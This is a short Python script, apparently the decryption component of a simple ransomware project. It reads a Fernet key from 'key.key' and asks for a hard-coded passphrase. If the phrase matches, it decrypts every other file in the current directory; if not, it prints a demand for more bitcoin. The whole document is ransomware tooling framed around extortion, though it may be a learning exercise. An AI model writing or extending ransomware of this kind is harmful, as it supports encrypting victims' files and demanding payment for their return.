#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet


files = []

for file in os.listdir():
        if file == "ransome.py" or file == "key.key" or file == "decrypt.py":
                continue
        if os.path.isfile(file):
                files.append(file)

print(files)


with open("key.key", "rb") as key:
        secretkey = key.read()

secretphrase = "26112"

user_phrase = input("enter the secret phrase to decrypt your files\n")

if user_phrase == secretphrase:
        for file in files:
                with open(file, "rb") as thefile:
                        contents = thefile.read()
                contents_decrypted = Fernet(secretkey).decrypt(contents)
                with open(file, "wb") as thefile:
                        thefile.write(contents_decrypted)
                print("Congrats on getting your files back")
else:
        print("Wrong passphrase send me more bitcoin")
